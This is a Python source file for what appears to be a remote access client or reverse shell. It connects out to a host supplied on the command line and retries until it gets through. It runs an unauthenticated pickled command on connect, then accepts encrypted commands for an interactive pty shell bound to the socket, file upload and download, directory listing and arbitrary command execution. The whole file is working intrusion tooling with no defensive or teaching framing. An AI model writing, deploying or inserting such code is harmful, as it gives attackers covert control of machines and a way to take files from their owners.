from crypt import ClientPyEncryption
from utils import NO_OUTPUT_SIGNAL
import subprocess
import argparse
import logging
import select
import socket
import pickle
import json
import time
import pty
import os

logging.basicConfig(level=None)

def stat_to_dict(stat_obj):
    return {
        'st_mode': stat_obj.st_mode,
        'st_ino': stat_obj.st_ino,
        'st_dev': stat_obj.st_dev,
        'st_nlink': stat_obj.st_nlink,
        'st_uid': stat_obj.st_uid,
        'st_gid': stat_obj.st_gid,
        'st_size': stat_obj.st_size,
        'st_atime': stat_obj.st_atime,
        'st_mtime': stat_obj.st_mtime,
        'st_ctime': stat_obj.st_ctime
    }

def scandir_to_dict(path=None):
    if not path: path = None
    entries = os.scandir(path)
    entries_list = []

    for entry in entries:
        entry_dict = {
            'name': entry.name,
            'path': entry.path,
            'inode': entry.inode(),
            'is_dir': entry.is_dir(),
            'is_file': entry.is_file(),
            'is_symlink': entry.is_symlink(),
        }
        try:
            entry_dict['stat'] = stat_to_dict(entry.stat())
        except Exception as e:
            entry_dict['stat'] = str(e)
        entries_list.append(entry_dict)
    entries_list = sorted(entries_list, key=lambda x: x['name'])
    return json.dumps((entries_list))

class Shell:
    def __init__(self):
        self.end_marker = "END_OF_COMMAND"

    def execute_command(self, command):
        completed_process = subprocess.run(["/bin/bash", "-c", command],
                                           stdout=subprocess.PIPE,
                                           stderr=subprocess.PIPE)

        return completed_process.stdout, completed_process.stderr

    def read_output(self):
        out, err = b"", b""
        while True:
            reads = [self.proc.stdout.fileno(), self.proc.stderr.fileno()]
            ret = select.select(reads, [], [], 0.1)

            for fd in ret[0]:
                if fd == self.proc.stderr.fileno():
                    err += self.proc.stderr.read1()
                if fd == self.proc.stdout.fileno():
                    chunk = self.proc.stdout.read1()
                    out += chunk
                    if self.end_marker.encode() in chunk:
                        return out[:-len(self.end_marker)], err

class NetManager:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        while True:
            try:
                self.socket = self.connect_to_host()
            except ConnectionRefusedError:
                time.sleep(1)
                continue
            break
        self.shell = Shell()
        data = pickle.loads(self.socket.recv(1024))
        self.socket.sendall(self.execute_command(data).encode())
        self.crypto = ClientPyEncryption()

    def connect_to_host(self):
        """Establishes a connection to the host."""
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((self.host, self.port))
        return s

    def receive_file(self, filename, data):
        """Receives a file from the socket and writes it to the local system."""
        with open(filename.split("/")[-1], "wb") as f:
            f.write(data)
        self.send_msg("")

    def send_file(self, filename):
        """Reads a file from the local system and sends it through the socket."""
        with open(filename, "rb") as f:
            serialized = f.read()

        self.send_msg(serialized)

    def change_directory(self, folder):
        try:
            os.chdir(folder)
            stdout_value = NO_OUTPUT_SIGNAL
        except FileNotFoundError:
            stdout_value = f"error: {folder} not found"
        finally:
            self.send_msg(stdout_value)

    def handle_commands(self, data):
        """Add description"""
        command = data[0]
        args = data[1:]
        match command:
            case "shell":
                self.send_msg(NO_OUTPUT_SIGNAL)
                # Save the old file descriptors
                old_stdin = os.dup(0)
                old_stdout = os.dup(1)
                old_stderr = os.dup(2)
                file_descriptor = self.socket.fileno()
                # Duplicate the file descriptor for standard input, output, and error
                os.dup2(file_descriptor, 0)  # Standard Input
                os.dup2(file_descriptor, 1)  # Standard Output
                os.dup2(file_descriptor, 2)  # Standard Error

                # Spawn a new shell process
                pty.spawn("/bin/bash")
                # After the pty.spawn is done, restore the old file descriptors
                self.socket.sendall(b"PotatoeMunchkinExit132@@")
                self.socket.recv(1)
                os.dup2(old_stdin, 0)
                os.dup2(old_stdout, 1)
                os.dup2(old_stderr, 2)
                return True
            case "ls":
                filepath = args[0]
                if filepath:
                    self.send_msg(scandir_to_dict(filepath))
                else:
                    self.send_msg(scandir_to_dict())
                return True
            case "cd":
                self.change_directory(args[0])
                return True
            case "put_file":
                self.receive_file(args[0], args[1])
                return True
            case "get_file":
                self.send_file(args[0])
                return True
            case "aliv":
                self.send_response(b"is_alive")
                return True
            case "cmd":
                self.send_msg(self.execute_command(args))
                return True
        return False

    def execute_command(self, data):
        """Executes a command and sends the response back through the socket."""
        result = subprocess.run(data, capture_output=True, text=True)
        return f"{result.stdout}{result.stderr}"

    def send_msg(self, data):
        data = pickle.dumps(data)
        if len(data) > 0:
            message_length, message = self.crypto.encrypt_message(data, self.crypto.derived_key)
            self.socket.sendall(message_length.to_bytes(4, byteorder="big"))
            self.socket.sendall(message)
        else:
            message_length, message = self.crypto.encrypt_message(NO_OUTPUT_SIGNAL, self.crypto.derived_key)
            self.socket.sendall(message_length.to_bytes(4, byteorder="big"))
            self.socket.sendall(message)

    def recv_msg(self):
        chunk = b""
        self.crypto.derived_key = self.crypto.get_derived_key(self.crypto.parameters, self.socket)
        data_length_bytes = self.socket.recv(4)
        data_length = int.from_bytes(data_length_bytes, byteorder="big")
        data_bytes = bytearray()
        while len(data_bytes) < data_length:
            chunk = self.socket.recv(data_length - len(data_bytes))
            if chunk == b"":
                raise RuntimeError("socket connection broken")
            data_bytes.extend(chunk)

        return self.crypto.decrypt_message(bytes(data_bytes), self.crypto.derived_key)


    def netloop(self):
        self.crypto.parameters = self.crypto.get_params(self.socket)

        while True:
            try:
                msg = pickle.loads(self.recv_msg())
            except ConnectionResetError:
                break
        
            if not msg:
                break
        
            try:
                self.handle_commands(msg)
            except BrokenPipeError:
                logging.error("Connection closed by the host.")
                break
            except Exception as e:
                self.send_msg(e)


def main():
    """Main function to parse arguments and start execution."""
    parser = argparse.ArgumentParser()
    parser.add_argument("--host")
    parser.add_argument("--port", type=int)
    parser.add_argument("--test", action="store_true")
    args = parser.parse_args()
    if args.test:
        print("Hello world! Wasd")
        return
    
    net_manager = NetManager(args.host, args.port)
    net_manager.netloop()


if __name__ == "__main__":
    main()